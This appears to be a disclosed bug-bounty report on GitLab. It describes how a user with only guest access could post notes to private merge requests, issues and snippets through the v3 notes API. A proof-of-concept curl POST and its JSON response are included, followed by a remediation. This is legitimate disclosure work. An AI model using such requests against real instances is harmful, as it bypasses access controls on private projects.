# Users with guest access can post notes to private merge requests, issues, and snippets

## Report Details
- **Report ID**: 195140
- **URL**: https://hackerone.com/reports/195140
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-01T20:46:09.325Z
- **Disclosed**: 2017-01-23T23:09:37.689Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
# Vulnerability details
A user with guest access to a group / project can post notes to private merge requests, issues, and snippets.

# Impact
It seems it only allows an attacker to post notes to objects that the user doesn't have access to. I tried creating notes with slash commands, but unfortunately that didn't work. The hypothesis was to assign myself to an issue or merge request, and then access the object through the API. I'm unsure whether this is a security bug, but when a user is assigned to a merge request, it cannot access the MR through the web application, but it can access the MR through the API.

# Proof of concept
1. As a group / project owner, invite someone with guest access
2. As the same user, create a merge request (or issue or snippet, they all work) - this MR is not accessible by users with guest access
3. Accept the invitation as a new user and create an API token for your account
4. Now send a `POST` request to the notes API with a reference to the `MR`:

**Request**
```
curl -X POST -H "Private-Token: XXXX" http://gitlab-instance/api/v3/projects/1/merge_requests/2/notes -d 'body=Hello+world'
```

**Response**
```json
{
  "id": 1,
  "body": "Hello world",
  "attachment": null,
  "author": {
    "name": "Jobert Abma",
    "username": "jobertabma",
    "id": 1,
    "state": "active",
    "avatar_url": "...",
    "web_url": "..."
  },
  "created_at": "2017-01-01T20:33:44.360Z",
  "updated_at": "2017-01-01T20:33:44.360Z",
  "system": false,
  "noteable_id": 2,
  "noteable_type": "MergeRequest",
  "upvote?": false,
  "downvote?": false
}
```

When requesting the discussion page of the private MR, you'll notice that the note was posted, even though the user does not have permissions to do so.

{F148594}

# Remediation
Make sure the correct ACL is checked before creating the note.

## Attachments
- Screen_Shot_2017-01-01_at_21.45.42.png
